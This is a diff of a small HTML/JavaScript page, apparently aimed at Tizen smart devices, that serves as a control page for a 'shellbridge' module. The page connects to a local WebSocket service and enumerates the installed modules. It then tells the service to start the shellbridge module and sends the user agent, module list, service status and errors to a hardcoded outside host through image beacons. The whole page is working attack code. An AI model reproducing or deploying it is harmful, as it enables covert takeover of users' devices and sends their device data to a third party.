@@ -1,30 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head><title>ShellBridge</title></head>
-<body style="background:#000;color:#fff;font-family:monospace">
-<h3>ShellBridge v3</h3>
-<p id="st">iniciando...</p>
+<head><title>SB ctrl</title></head>
+<body style="background:#000;color:#fff"><h3>SB ctrl</h3><p id="st">...</p>
 <script>
-(function () {
-    var HOST = '192.168.1.55';
-    function beacon(path) {
-        try {
-            var img = new Image();
-            img.src = 'http://' + HOST + ':8000/' + path;
-        } catch (e) {}
-        try {
-            var x = new XMLHttpRequest();
-            x.open('GET', 'http://' + HOST + ':8000/' + path, true);
-            x.send();
-        } catch (e) {}
+var HOST = '192.168.1.55';
+function beacon(p) {
+    try { var i = new Image(); i.src = 'http://' + HOST + ':8000/' + p; } catch (e) {}
+    try { document.getElementById('st').textContent = p; } catch (e) {}
+}
+beacon('ctrl?step=load&ua=' + encodeURIComponent(navigator.userAgent));
+var ws = new WebSocket('ws://127.0.0.1:8081');
+var mod = null;
+ws.onopen = function () {
+    beacon('ctrl?step=wsopen');
+    ws.send(JSON.stringify({ type: 4, payload: true })); // GetModules (fresh)
+};
+ws.onmessage = function (ev) {
+    try {
+        var m = JSON.parse(ev.data);
+        if (m.type === 4) {
+            var arr = m.payload || [];
+            var names = [];
+            for (var i = 0; i < arr.length; i++) {
+                names.push(arr[i].name + '|' + (arr[i].serviceFile || '-'));
+                if (arr[i].name === 'shellbridge') { mod = arr[i]; }
+            }
+            beacon('ctrl?modules=' + encodeURIComponent(names.join(',')));
+            if (mod) {
+                beacon('ctrl?step=startsvc');
+                ws.send(JSON.stringify({ type: 6, payload: mod })); // StartService
+            } else {
+                beacon('ctrl?step=nomodule');
+            }
+        } else if (m.type === 7) {
+            beacon('ctrl?svcstatus=' + encodeURIComponent(JSON.stringify(m.payload || [])));
+        } else if (m.type === 8) {
+            beacon('ctrl?err=' + encodeURIComponent(JSON.stringify(m.payload)));
+        }
+    } catch (e) {
+        beacon('ctrl?ex=' + encodeURIComponent(String(e)));
     }
-    var info = 'page?ua=' + encodeURIComponent(navigator.userAgent);
-    try { info += '&tizen=' + (typeof window.tizen !== 'undefined' ? 'si' : 'no'); } catch (e) {}
-    try { info += '&tsapp=' + (window.tizen && tizen.application ? tizen.application.getCurrentApplication().appInfo.id : 'n/a'); } catch (e) {}
-    beacon(info);
-    try { document.getElementById('st').textContent = 'baliza enviada'; } catch (e) {}
-    setInterval(function () { beacon('pagekeep'); }, 10000);
-})();
+};
+ws.onerror = function () { beacon('ctrl?step=wserror'); };
+setInterval(function () {
+    if (ws && ws.readyState === 1) { ws.send(JSON.stringify({ type: 7 })); }
+    beacon('ctrl?keep');
+}, 12000);
 </script>
 </body>
 </html>
